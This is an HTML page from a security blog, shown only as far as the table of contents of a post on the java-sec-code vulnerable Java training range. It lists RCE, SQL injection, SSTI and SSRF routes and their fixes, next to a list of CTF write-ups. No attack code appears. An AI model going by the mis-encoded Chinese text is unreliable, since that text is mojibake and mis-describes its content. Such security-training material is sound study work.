<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>java-sec-codeé¶åœºå­¦ä¹  | ç”œç­’å›­</title>
  <meta name="keywords" content=" Javaå®‰å…¨ ">
  <meta name="description" content="java-sec-codeé¶åœºå­¦ä¹  | ç”œç­’å›­">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="The Cloud Hunting Gamesæ¯”èµ›åœ°å€ï¼šhttps:&#x2F;&#x2F;cloudhuntinggames.com&#x2F; Chellenge1:Ainâ€™t no data when sheâ€™s goneæç¤ºè¯´æœ‰å¤§é‡æ•°æ®å¤–æµï¼Œä½†æ‹¥æœ‰å…¨éƒ¨çš„S3å­˜å‚¨æ¡¶æ—¥å¿—ã€‚æ ¹æ®å¤§é‡æ•°æ®å¤–æµå¯ç»Ÿè®¡ç›¸åŒuserIdentity_ARNè¯»å–å­—èŠ‚æ•°BytesOutè¿›è¡Œç»Ÿè®¡å€’åºè¾“å‡ºï¼Œç›¸å…³sqlè¯­å¥ä¸ºï¼š SELECT userIden">
<meta property="og:type" content="article">
<meta property="og:title" content="The Cloud Hunting Games">
<meta property="og:url" content="https://www.ttycp3.top/archives/5b899602.html">
<meta property="og:site_name" content="ç”œç­’å›­">
<meta property="og:description" content="The Cloud Hunting Gamesæ¯”èµ›åœ°å€ï¼šhttps:&#x2F;&#x2F;cloudhuntinggames.com&#x2F; Chellenge1:Ainâ€™t no data when sheâ€™s goneæç¤ºè¯´æœ‰å¤§é‡æ•°æ®å¤–æµï¼Œä½†æ‹¥æœ‰å…¨éƒ¨çš„S3å­˜å‚¨æ¡¶æ—¥å¿—ã€‚æ ¹æ®å¤§é‡æ•°æ®å¤–æµå¯ç»Ÿè®¡ç›¸åŒuserIdentity_ARNè¯»å–å­—èŠ‚æ•°BytesOutè¿›è¡Œç»Ÿè®¡å€’åºè¾“å‡ºï¼Œç›¸å…³sqlè¯­å¥ä¸ºï¼š SELECT userIden">
<meta property="og:locale">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250528111323383.png">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250528114751010.png">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250528122018997.png">
<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20250530145608487.png">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250530160601818.png">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/4ca77fda-3095-4e1a-b79b-a25377c79a1f.png">
<meta property="article:published_time" content="2025-05-30T08:13:54.055Z">
<meta property="article:modified_time" content="2025-05-30T08:15:13.582Z">
<meta property="article:author" content="ttycp3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250528111323383.png">


<link rel="icon" href="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/logo.png">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/gruvbox-dark.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 6.3.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



    <script>        (function(){            var bp = document.createElement('script');            var curProtocol = window.location.protocol.split(':')[0];            if (curProtocol === 'https') {                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';                    }            else {                bp.src = 'http://push.zhanzhang.baidu.com/push.js';            }            var s = document.getElementsByTagName("script")[0];            s.parentNode.insertBefore(bp, s);        })();    </script>  

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="http://q.qlogo.cn/headimg_dl?dst_uin=1004454362&amp;spec=640&amp;img_type=jpg"/>
</a>
<div class="author">
    <span>ttycp3</span>
</div>

<div class="icon">
    
        
            <a title="github"
               href="https://github.com/ttycp3"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="csdn"
               href="https://blog.csdn.net/qq_33814823"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-csdn"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="neteasemusic"
               href="https://music.163.com/#/user/home?id=1765543783"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-neteasemusic"></use>
                    </svg>
                
            </a>
        
    
</div>




<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(35)</small>
            
        </div>
    </li>
    
        
            
                <li>
                    <div data-rel="Writeup">
                        
                        Writeup
                        <small>(27)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="ç¬”è®°">
                        
                        ç¬”è®°
                        <small>(5)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="å·¥å…·">
                        
                        å·¥å…·
                        <small>(1)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="ç®—æ³•ç«èµ›ä¸“é¢˜">
                        
                        ç®—æ³•ç«èµ›ä¸“é¢˜
                        <small>(2)</small>
                        
                    </div>
                    
                </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
            
    </div>
    <div>
        
        <a 
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="35">
<input type="hidden" id="yelog_site_word_count" value="54.9k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://badboy.plus">åå­©å­</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="æœç´¢ å¿«æ·é”® i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="åˆ‡æ¢åˆ°å¤§çº²è§†å›¾ å¿«æ·é”® w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="è¿”å›"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="å¤§å°å†™æ•æ„Ÿ"></i>
            <i class="iconfont icon-tag" data-title="æ ‡ç­¾"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">å¤§çº²</div>
            <i class="iconfont icon-list" data-title="åˆ‡æ¢åˆ°æ–‡ç« åˆ—è¡¨"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æµé‡åˆ†æ</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å‘½ä»¤æ‰§è¡Œ</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ä»»æ„æ–‡ä»¶è¯»å–</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ–‡ä»¶ä¸Šä¼ </a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ‚é¡¹</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>CRLF Injection</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>gopheråè®®</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>grafana</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Javaå®‰å…¨</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>JAVAå®‰å…¨</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>jwtä¼ªé€ </a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>pickleååºåˆ—åŒ–</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sessionååºåˆ—åŒ–</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sqlæ³¨å…¥</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ssrfæ¼æ´</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>XPathæ³¨å…¥</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>xxeæ¼æ´</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        
        <a  class="All Writeup "
           href="/archives/5b899602.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="The Cloud Hunting Games">The Cloud Hunting Games</span>
            <span class="post-date" title="2025-05-30 16:13:54">2025/05/30</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/24b70928.html"
           data-tag="Javaå®‰å…¨"
           data-author="" >
            <span class="post-title" title="ç¾ŠåŸæ¯2020 a_piece_of_java">ç¾ŠåŸæ¯2020 a_piece_of_java</span>
            <span class="post-date" title="2024-11-12 17:46:24">2024/11/12</span>
        </a>
        
        
        <a  class="All ç¬”è®° "
           href="/archives/218e91a9.html"
           data-tag="Javaå®‰å…¨"
           data-author="" >
            <span class="post-title" title="java-sec-codeé¶åœºå­¦ä¹ ">java-sec-codeé¶åœºå­¦ä¹ </span>
            <span class="post-date" title="2024-09-30 16:59:59">2024/09/30</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/f8a3bab8.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CITS1003 CTF wp">CITS1003 CTF wp</span>
            <span class="post-date" title="2024-05-09 16:21:59">2024/05/09</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/e228e2bf.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="XYCTF2024">XYCTF2024</span>
            <span class="post-date" title="2024-04-28 14:40:53">2024/04/28</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/53f30b58.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="NCTF2023webï¼ˆèµ›åå¤ç°ï¼‰">NCTF2023webï¼ˆèµ›åå¤ç°ï¼‰</span>
            <span class="post-date" title="2023-12-31 16:31:14">2023/12/31</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/3b79de97.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="SHCTF wp">SHCTF wp</span>
            <span class="post-date" title="2023-10-02 13:25:28">2023/10/02</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/d4f5203b.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="0xGame2023 wp">0xGame2023 wp</span>
            <span class="post-date" title="2023-10-01 14:16:22">2023/10/01</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/83697f53.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Moectf2023">Moectf2023</span>
            <span class="post-date" title="2023-09-16 11:44:15">2023/09/16</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/7a95ce38.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="SYCTF2023wp">SYCTF2023wp</span>
            <span class="post-date" title="2023-06-10 12:48:24">2023/06/10</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/1d622977.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="ç¬¬16å±Šciscnåˆèµ›wp">ç¬¬16å±Šciscnåˆèµ›wp</span>
            <span class="post-date" title="2023-05-28 18:51:15">2023/05/28</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/7dc07b0.html"
           data-tag="æµé‡åˆ†æ,æ‚é¡¹"
           data-author="" >
            <span class="post-title" title="ç¬¬å››å±Šé—½ç›¾æ¯Miscæµé‡åˆ†æ">ç¬¬å››å±Šé—½ç›¾æ¯Miscæµé‡åˆ†æ</span>
            <span class="post-date" title="2023-05-25 14:23:16">2023/05/25</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/4524613a.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Ã¥ngstromCTF 2023">Ã¥ngstromCTF 2023</span>
            <span class="post-date" title="2023-04-25 15:17:57">2023/04/25</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/37321197.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="HDCTF2023">HDCTF2023</span>
            <span class="post-date" title="2023-04-24 16:30:04">2023/04/24</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/3527c39a.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="ç¬¬ä¸‰å±Šçº¢æ˜è°·æ¯">ç¬¬ä¸‰å±Šçº¢æ˜è°·æ¯</span>
            <span class="post-date" title="2023-04-19 14:18:45">2023/04/19</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/6ee431f.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="GDOUCTF2023">GDOUCTF2023</span>
            <span class="post-date" title="2023-04-16 12:42:03">2023/04/16</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/e92ae896.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="HackPack CTF 2023">HackPack CTF 2023</span>
            <span class="post-date" title="2023-04-15 16:32:49">2023/04/15</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/c603889a.html"
           data-tag="pickleååºåˆ—åŒ–,jwtä¼ªé€ "
           data-author="" >
            <span class="post-title" title="CISCN2019 ååŒ—èµ›åŒº Day1 ikun">CISCN2019 ååŒ—èµ›åŒº Day1 ikun</span>
            <span class="post-date" title="2023-04-12 15:17:10">2023/04/12</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/b85a28bc.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTFSHOWç¬¬ä¸‰å±Šæ„šäººæ¯éƒ¨åˆ†WP">CTFSHOWç¬¬ä¸‰å±Šæ„šäººæ¯éƒ¨åˆ†WP</span>
            <span class="post-date" title="2023-04-02 19:28:10">2023/04/02</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/fcef946.html"
           data-tag="æ–‡ä»¶ä¸Šä¼ ,ä»»æ„æ–‡ä»¶è¯»å–,JAVAå®‰å…¨"
           data-author="" >
            <span class="post-title" title="GKCTF2021 babycat">GKCTF2021 babycat</span>
            <span class="post-date" title="2023-04-01 19:45:19">2023/04/01</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/56a79676.html"
           data-tag="ssrfæ¼æ´"
           data-author="" >
            <span class="post-title" title="GYCTF2020 Node Game">GYCTF2020 Node Game</span>
            <span class="post-date" title="2023-03-21 16:21:32">2023/03/21</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/f06c7905.html"
           data-tag="ssrfæ¼æ´,gopheråè®®"
           data-author="" >
            <span class="post-title" title="2023æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-æ•°å­—ç½‘ç»œå®‰å…¨äººæ‰æŒ‘æˆ˜èµ›easy_curl">2023æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-æ•°å­—ç½‘ç»œå®‰å…¨äººæ‰æŒ‘æˆ˜èµ›easy_curl</span>
            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/2e3a56ed.html"
           data-tag="xxeæ¼æ´"
           data-author="" >
            <span class="post-title" title="GoogleCTF2019 Quals Bnv">GoogleCTF2019 Quals Bnv</span>
            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/32149828.html"
           data-tag="ssrfæ¼æ´,sessionååºåˆ—åŒ–,CRLF Injection"
           data-author="" >
            <span class="post-title" title="bestphp&#39;s revenge">bestphp&#39;s revenge</span>
            <span class="post-date" title="2023-03-14 19:17:23">2023/03/14</span>
        </a>
        
        
        <a  class="All ç¬”è®° "
           href="/archives/54488cb7.html"
           data-tag="XPathæ³¨å…¥"
           data-author="" >
            <span class="post-title" title="Xpathç¬”è®°">Xpathç¬”è®°</span>
            <span class="post-date" title="2023-03-11 21:17:23">2023/03/11</span>
        </a>
        
        
        <a  class="All ç®—æ³•ç«èµ›ä¸“é¢˜ "
           href="/archives/68b41866.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="å¸¸ç”¨ç®€å•æ¨¡æ¿">å¸¸ç”¨ç®€å•æ¨¡æ¿</span>
            <span class="post-date" title="2022-10-23 12:17:23">2022/10/23</span>
        </a>
        
        
        <a  class="All ç®—æ³•ç«èµ›ä¸“é¢˜ "
           href="/archives/2bd6ac.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="ä»cå‡çº§åˆ°c++é€Ÿæˆ">ä»cå‡çº§åˆ°c++é€Ÿæˆ</span>
            <span class="post-date" title="2022-10-20 13:47:23">2022/10/20</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/66731dbe.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="NEWSTARCTF2022-Web">NEWSTARCTF2022-Web</span>
            <span class="post-date" title="2022-10-06 23:53:26">2022/10/06</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/ac4562c6.html"
           data-tag="å‘½ä»¤æ‰§è¡Œ"
           data-author="" >
            <span class="post-title" title="ctfshowä¸ƒå¤•æ¯wp">ctfshowä¸ƒå¤•æ¯wp</span>
            <span class="post-date" title="2022-08-06 17:17:23">2022/08/06</span>
        </a>
        
        
        <a  class="All ç¬”è®° "
           href="/archives/ec3e2815.html"
           data-tag="æ–‡ä»¶ä¸Šä¼ "
           data-author="" >
            <span class="post-title" title="Webshellç¬”è®°">Webshellç¬”è®°</span>
            <span class="post-date" title="2022-05-13 21:17:23">2022/05/13</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/e9530a94.html"
           data-tag="grafana"
           data-author="" >
            <span class="post-title" title="STARCTF2022 oh-my-grafana">STARCTF2022 oh-my-grafana</span>
            <span class="post-date" title="2022-04-16 23:53:26">2022/04/16</span>
        </a>
        
        
        <a  class="All ç¬”è®° "
           href="/archives/1a0e10db.html"
           data-tag="ssrfæ¼æ´"
           data-author="" >
            <span class="post-title" title="SSRFç¬”è®°">SSRFç¬”è®°</span>
            <span class="post-date" title="2022-03-30 21:47:23">2022/03/30</span>
        </a>
        
        
        <a  class="All ç¬”è®° "
           href="/archives/a00344c6.html"
           data-tag="sqlæ³¨å…¥"
           data-author="" >
            <span class="post-title" title="SQLæ³¨å…¥ç¬”è®°">SQLæ³¨å…¥ç¬”è®°</span>
            <span class="post-date" title="2022-03-24 20:17:23">2022/03/24</span>
        </a>
        
        
        <a  class="All å·¥å…· "
           href="/archives/7450bfcb.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="å®ç”¨å·¥å…·">å®ç”¨å·¥å…·</span>
            <span class="post-date" title="2022-01-24 18:17:23">2022/01/24</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/bff3fd5a.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="æ”»é˜²ä¸–ç•Œwebæ–°æ‰‹åŒºWriteup">æ”»é˜²ä¸–ç•Œwebæ–°æ‰‹åŒºWriteup</span>
            <span class="post-date" title="2022-01-16 18:17:23">2022/01/16</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="åˆ‡æ¢å…¨å± å¿«æ·é”® s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-java-sec-codeé¶åœºå­¦ä¹ " class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">java-sec-codeé¶åœºå­¦ä¹ </h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="ç¬”è®°">ç¬”è®°</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color2">Javaå®‰å…¨</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2024-10-09 11:35:23'>2024-09-30 16:59</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:11.6k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views ğŸ‘€ :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="è·³è½¬è‡³è¯„è®ºåŒº">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE"><span class="toc-text">ä¸€ã€RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-runtime-x2F-exec"><span class="toc-text">1.è·¯ç”±&#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-ProcessBuilder"><span class="toc-text">2.è·¯ç”±&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-jscmd"><span class="toc-text">3.è·¯ç”±&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-vuln-x2F-yarm"><span class="toc-text">4.è·¯ç”±&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-groovy"><span class="toc-text">5.è·¯ç”±&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">äºŒã€SQLæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-vuln"><span class="toc-text">1.è·¯ç”±&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><span class="toc-text">2.è·¯ç”±&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln01"><span class="toc-text">3.è·¯ç”±&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln02"><span class="toc-text">3.è·¯ç”±&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-mybatis-x2F-orderby-x2F-vuln03"><span class="toc-text">4.è·¯ç”±&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">ï¼ˆ1ï¼‰é¢„ç¼–è¯‘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89waf"><span class="toc-text">ï¼ˆ2ï¼‰waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89MyBatis%E9%98%B2%E6%8A%A4"><span class="toc-text">ï¼ˆ3ï¼‰MyBatisé˜²æŠ¤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSTI"><span class="toc-text">ä¸‰ã€SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssti-x2F-velocity"><span class="toc-text">1.è·¯ç”±&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF"><span class="toc-text">å››ã€SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-urlConnection-x2F-vuln"><span class="toc-text">1.è·¯ç”±&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><span class="toc-text">2.è·¯ç”±&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-openStream"><span class="toc-text">3.è·¯ç”±&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><span class="toc-text">4.è·¯ç”±&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><span class="toc-text">5.è·¯ç”±&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><span class="toc-text">6.è·¯ç”±&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-hutool-x2F-vuln"><span class="toc-text">7.è·¯ç”±&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-denrebind-x2F-vuln"><span class="toc-text">8.è·¯ç”±&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">SSRFä¿®å¤ä¸é˜²æŠ¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">ï¼ˆ1ï¼‰é™åˆ¶åè®®ä½¿ç”¨</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">ï¼ˆ2ï¼‰é™åˆ¶æ–‡ä»¶ç±»å‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89http%E8%AF%B7%E6%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">ï¼ˆ3ï¼‰httpè¯·æ±‚æ£€æŸ¥</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A"><span class="toc-text">æ–¹æ³•1ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A"><span class="toc-text">æ–¹æ³•2ï¼š</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A"><span 